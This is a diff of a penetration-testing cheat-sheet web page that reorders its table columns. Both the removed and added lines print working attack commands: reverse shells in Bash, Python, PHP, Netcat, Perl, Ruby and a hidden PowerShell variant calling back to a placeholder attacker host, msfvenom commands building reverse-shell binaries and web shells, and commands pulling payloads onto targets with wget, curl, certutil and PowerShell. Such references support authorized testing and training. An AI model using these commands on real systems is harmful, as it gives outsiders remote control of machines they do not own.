@@ -860,17 +860,17 @@ tr:hover .k-copy-btn { opacity: 1; }
       <div class="k-cheat-cat-title"><i class="fas fa-terminal"></i> Reverse Shells &amp; Payloads</div>
       <div class="k-card" style="overflow-x:auto;padding:.75rem;">
         <table class="k-cheat-table">
-          <thead><tr><th>Shell / Payload</th><th>Command</th></tr></thead>
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
           <tbody>
-            <tr><td class="k-desc"><strong>Bash</strong></td><td><code>bash -i >& /dev/tcp/YOURIP/4444 0>&1</code></td></tr>
-            <tr><td class="k-desc"><strong>Python</strong></td><td><code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOURIP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></td></tr>
-            <tr><td class="k-desc"><strong>PHP</strong></td><td><code>php -r '$sock=fsockopen("YOURIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code></td></tr>
-            <tr><td class="k-desc"><strong>Netcat (traditional)</strong></td><td><code>nc -e /bin/bash YOURIP 4444</code></td></tr>
-            <tr><td class="k-desc"><strong>Netcat (no -e)</strong></td><td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP 4444 >/tmp/f</code></td></tr>
-            <tr><td class="k-desc"><strong>Perl</strong></td><td><code>perl -e 'use Socket;$i="YOURIP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'</code></td></tr>
-            <tr><td class="k-desc"><strong>Ruby</strong></td><td><code>ruby -rsocket -e'f=TCPSocket.open("YOURIP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code></td></tr>
-            <tr><td class="k-desc"><strong>PowerShell</strong></td><td><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('YOURIP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"</code></td></tr>
-            <tr><td class="k-desc"><strong>Upgrade to TTY</strong></td><td><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> then <code>Ctrl+Z</code> → <code>stty raw -echo;fg</code> → <code>export TERM=xterm</code></td></tr>
+            <tr><td><code>bash -i >& /dev/tcp/YOURIP/4444 0>&1</code></td><td class="k-desc">Bash reverse shell</td></tr>
+            <tr><td><code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOURIP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code></td><td class="k-desc">Python reverse shell</td></tr>
+            <tr><td><code>php -r '$sock=fsockopen("YOURIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code></td><td class="k-desc">PHP reverse shell</td></tr>
+            <tr><td><code>nc -e /bin/bash YOURIP 4444</code></td><td class="k-desc">Netcat reverse shell (traditional)</td></tr>
+            <tr><td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOURIP 4444 >/tmp/f</code></td><td class="k-desc">Netcat reverse shell (no -e)</td></tr>
+            <tr><td><code>perl -e 'use Socket;$i="YOURIP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'</code></td><td class="k-desc">Perl reverse shell</td></tr>
+            <tr><td><code>ruby -rsocket -e'f=TCPSocket.open("YOURIP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'</code></td><td class="k-desc">Ruby reverse shell</td></tr>
+            <tr><td><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('YOURIP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}"</code></td><td class="k-desc">PowerShell reverse shell</td></tr>
+            <tr><td><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> then <code>Ctrl+Z</code> → <code>stty raw -echo;fg</code> → <code>export TERM=xterm</code></td><td class="k-desc">Upgrade to full TTY</td></tr>
           </tbody>
         </table>
       </div>
@@ -881,17 +881,17 @@ tr:hover .k-copy-btn { opacity: 1; }
       <div class="k-cheat-cat-title"><i class="fas fa-bomb"></i> MSFvenom Payloads</div>
       <div class="k-card" style="overflow-x:auto;padding:.75rem;">
         <table class="k-cheat-table">
-          <thead><tr><th>Target</th><th>Command</th></tr></thead>
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
           <tbody>
-            <tr><td class="k-desc"><strong>Linux ELF</strong></td><td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f elf -o rev.elf</code></td></tr>
-            <tr><td class="k-desc"><strong>Linux Meterpreter</strong></td><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f elf -o met.elf</code></td></tr>
-            <tr><td class="k-desc"><strong>Windows EXE</strong></td><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f exe -o rev.exe</code></td></tr>
-            <tr><td class="k-desc"><strong>Windows Meterpreter</strong></td><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f exe -o met.exe</code></td></tr>
-            <tr><td class="k-desc"><strong>PHP</strong></td><td><code>msfvenom -p php/reverse_php LHOST=YOURIP LPORT=4444 -f raw -o shell.php</code></td></tr>
-            <tr><td class="k-desc"><strong>JSP</strong></td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f raw -o shell.jsp</code></td></tr>
-            <tr><td class="k-desc"><strong>WAR</strong></td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f war -o shell.war</code></td></tr>
-            <tr><td class="k-desc"><strong>Python</strong></td><td><code>msfvenom -p cmd/unix/reverse_python LHOST=YOURIP LPORT=4444 -f raw</code></td></tr>
-            <tr><td class="k-desc"><strong>ASP</strong></td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f asp -o shell.asp</code></td></tr>
+            <tr><td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f elf -o rev.elf</code></td><td class="k-desc">Linux ELF reverse shell</td></tr>
+            <tr><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f elf -o met.elf</code></td><td class="k-desc">Linux Meterpreter</td></tr>
+            <tr><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f exe -o rev.exe</code></td><td class="k-desc">Windows EXE reverse shell</td></tr>
+            <tr><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -f exe -o met.exe</code></td><td class="k-desc">Windows Meterpreter</td></tr>
+            <tr><td><code>msfvenom -p php/reverse_php LHOST=YOURIP LPORT=4444 -f raw -o shell.php</code></td><td class="k-desc">PHP reverse shell</td></tr>
+            <tr><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f raw -o shell.jsp</code></td><td class="k-desc">JSP reverse shell</td></tr>
+            <tr><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f war -o shell.war</code></td><td class="k-desc">WAR reverse shell</td></tr>
+            <tr><td><code>msfvenom -p cmd/unix/reverse_python LHOST=YOURIP LPORT=4444 -f raw</code></td><td class="k-desc">Python reverse shell payload</td></tr>
+            <tr><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f asp -o shell.asp</code></td><td class="k-desc">ASP reverse shell</td></tr>
           </tbody>
         </table>
       </div>
@@ -1010,18 +1010,18 @@ tr:hover .k-copy-btn { opacity: 1; }
       <div class="k-cheat-cat-title"><i class="fas fa-exchange-alt"></i> File Transfers</div>
       <div class="k-card" style="overflow-x:auto;padding:.75rem;">
         <table class="k-cheat-table">
-          <thead><tr><th>Method</th><th>Command</th></tr></thead>
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
           <tbody>
-            <tr><td class="k-desc"><strong>Python HTTP server</strong></td><td><code>python3 -m http.server 8080</code></td></tr>
-            <tr><td class="k-desc"><strong>wget (Linux target)</strong></td><td><code>wget http://YOURIP:8080/file -O /tmp/file</code></td></tr>
-            <tr><td class="k-desc"><strong>curl (Linux target)</strong></td><td><code>curl http://YOURIP:8080/file -o /tmp/file</code></td></tr>
-            <tr><td class="k-desc"><strong>Netcat send</strong></td><td><code>nc -lvnp 4444 < file</code> (sender) → <code>nc YOURIP 4444 > file</code> (receiver)</td></tr>
-            <tr><td class="k-desc"><strong>PowerShell download</strong></td><td><code>Invoke-WebRequest -Uri http://YOURIP:8080/file -OutFile C:\temp\file</code></td></tr>
-            <tr><td class="k-desc"><strong>PowerShell (short)</strong></td><td><code>iwr http://YOURIP:8080/file -o C:\temp\file</code></td></tr>
-            <tr><td class="k-desc"><strong>Certutil (Windows)</strong></td><td><code>certutil -urlcache -split -f http://YOURIP:8080/file C:\temp\file</code></td></tr>
-            <tr><td class="k-desc"><strong>SCP</strong></td><td><code>scp file user@target:/tmp/file</code></td></tr>
-            <tr><td class="k-desc"><strong>Base64 encode/decode</strong></td><td><code>base64 file > encoded.txt</code> → transfer → <code>base64 -d encoded.txt > file</code></td></tr>
-            <tr><td class="k-desc"><strong>SMB server (Impacket)</strong></td><td><code>impacket-smbserver share . -smb2support</code> → <code>copy \\YOURIP\share\file .</code></td></tr>
+            <tr><td><code>python3 -m http.server 8080</code></td><td class="k-desc">Start Python HTTP server</td></tr>
+            <tr><td><code>wget http://YOURIP:8080/file -O /tmp/file</code></td><td class="k-desc">Download file with wget (Linux)</td></tr>
+            <tr><td><code>curl http://YOURIP:8080/file -o /tmp/file</code></td><td class="k-desc">Download file with curl (Linux)</td></tr>
+            <tr><td><code>nc -lvnp 4444 < file</code> → <code>nc YOURIP 4444 > file</code></td><td class="k-desc">Transfer via Netcat (sender → receiver)</td></tr>
+            <tr><td><code>Invoke-WebRequest -Uri http://YOURIP:8080/file -OutFile C:\temp\file</code></td><td class="k-desc">PowerShell download</td></tr>
+            <tr><td><code>iwr http://YOURIP:8080/file -o C:\temp\file</code></td><td class="k-desc">PowerShell download (short alias)</td></tr>
+            <tr><td><code>certutil -urlcache -split -f http://YOURIP:8080/file C:\temp\file</code></td><td class="k-desc">Certutil download (Windows)</td></tr>
+            <tr><td><code>scp file user@target:/tmp/file</code></td><td class="k-desc">Secure copy via SSH</td></tr>
+            <tr><td><code>base64 file > encoded.txt</code> → <code>base64 -d encoded.txt > file</code></td><td class="k-desc">Base64 encode/decode transfer</td></tr>
+            <tr><td><code>impacket-smbserver share . -smb2support</code> → <code>copy \\YOURIP\share\file .</code></td><td class="k-desc">SMB server via Impacket</td></tr>
           </tbody>
         </table>
       </div>
@@ -1149,22 +1149,22 @@ tr:hover .k-copy-btn { opacity: 1; }
       <div class="k-cheat-cat-title"><i class="fas fa-magic"></i> Useful One-Liners</div>
       <div class="k-card" style="overflow-x:auto;padding:.75rem;">
         <table class="k-cheat-table">
-          <thead><tr><th>Purpose</th><th>Command</th></tr></thead>
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
           <tbody>
-            <tr><td class="k-desc"><strong>Spawn TTY</strong></td><td><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></td></tr>
-            <tr><td class="k-desc"><strong>Full interactive shell</strong></td><td><code>Ctrl+Z</code> → <code>stty raw -echo;fg</code> → <code>reset</code> → <code>export TERM=xterm</code> → <code>stty rows 40 cols 160</code></td></tr>
-            <tr><td class="k-desc"><strong>Simple web server</strong></td><td><code>python3 -m http.server 80</code></td></tr>
-            <tr><td class="k-desc"><strong>Generate SSH key</strong></td><td><code>ssh-keygen -t rsa -b 4096 -f id_rsa</code></td></tr>
-            <tr><td class="k-desc"><strong>Port scan (no nmap)</strong></td><td><code>for p in $(seq 1 65535); do (echo >/dev/tcp/target/$p) 2>/dev/null && echo "$p open"; done</code></td></tr>
-            <tr><td class="k-desc"><strong>Ping sweep (no nmap)</strong></td><td><code>for i in $(seq 1 254); do (ping -c 1 10.10.10.$i | grep "bytes from" &); done</code></td></tr>
-            <tr><td class="k-desc"><strong>Extract .gz wordlist</strong></td><td><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></td></tr>
-            <tr><td class="k-desc"><strong>Convert epoch time</strong></td><td><code>date -d @1609459200</code></td></tr>
-            <tr><td class="k-desc"><strong>URL encode</strong></td><td><code>python3 -c "import urllib.parse;print(urllib.parse.quote('string'))"</code></td></tr>
-            <tr><td class="k-desc"><strong>URL decode</strong></td><td><code>python3 -c "import urllib.parse;print(urllib.parse.unquote('%73%74%72'))"</code></td></tr>
-            <tr><td class="k-desc"><strong>ROT13</strong></td><td><code>echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td></tr>
-            <tr><td class="k-desc"><strong>Quick checksum</strong></td><td><code>md5sum file && sha1sum file && sha256sum file</code></td></tr>
-            <tr><td class="k-desc"><strong>Watch for changes</strong></td><td><code>watch -n 1 'ls -la /tmp'</code></td></tr>
-            <tr><td class="k-desc"><strong>Base64 file</strong></td><td><code>base64 -w 0 binary > b64.txt</code> (transfer, then <code>base64 -d b64.txt > binary</code>)</td></tr>
+            <tr><td><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></td><td class="k-desc">Spawn TTY shell</td></tr>
+            <tr><td><code>Ctrl+Z</code> → <code>stty raw -echo;fg</code> → <code>reset</code> → <code>export TERM=xterm</code> → <code>stty rows 40 cols 160</code></td><td class="k-desc">Upgrade to full interactive shell</td></tr>
+            <tr><td><code>python3 -m http.server 80</code></td><td class="k-desc">Simple web server</td></tr>
+            <tr><td><code>ssh-keygen -t rsa -b 4096 -f id_rsa</code></td><td class="k-desc">Generate SSH key</td></tr>
+            <tr><td><code>for p in $(seq 1 65535); do (echo >/dev/tcp/target/$p) 2>/dev/null && echo "$p open"; done</code></td><td class="k-desc">Port scan without nmap</td></tr>
+            <tr><td><code>for i in $(seq 1 254); do (ping -c 1 10.10.10.$i | grep "bytes from" &); done</code></td><td class="k-desc">Ping sweep without nmap</td></tr>
+            <tr><td><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></td><td class="k-desc">Extract rockyou wordlist</td></tr>
+            <tr><td><code>date -d @1609459200</code></td><td class="k-desc">Convert epoch timestamp</td></tr>
+            <tr><td><code>python3 -c "import urllib.parse;print(urllib.parse.quote('string'))"</code></td><td class="k-desc">URL encode a string</td></tr>
+            <tr><td><code>python3 -c "import urllib.parse;print(urllib.parse.unquote('%73%74%72'))"</code></td><td class="k-desc">URL decode a string</td></tr>
+            <tr><td><code>echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td><td class="k-desc">ROT13 encode/decode</td></tr>
+            <tr><td><code>md5sum file && sha1sum file && sha256sum file</code></td><td class="k-desc">Quick checksum (MD5, SHA1, SHA256)</td></tr>
+            <tr><td><code>watch -n 1 'ls -la /tmp'</code></td><td class="k-desc">Watch directory for changes</td></tr>
+            <tr><td><code>base64 -w 0 binary > b64.txt</code> → <code>base64 -d b64.txt > binary</code></td><td class="k-desc">Base64 file transfer</td></tr>
           </tbody>
         </table>
       </div>
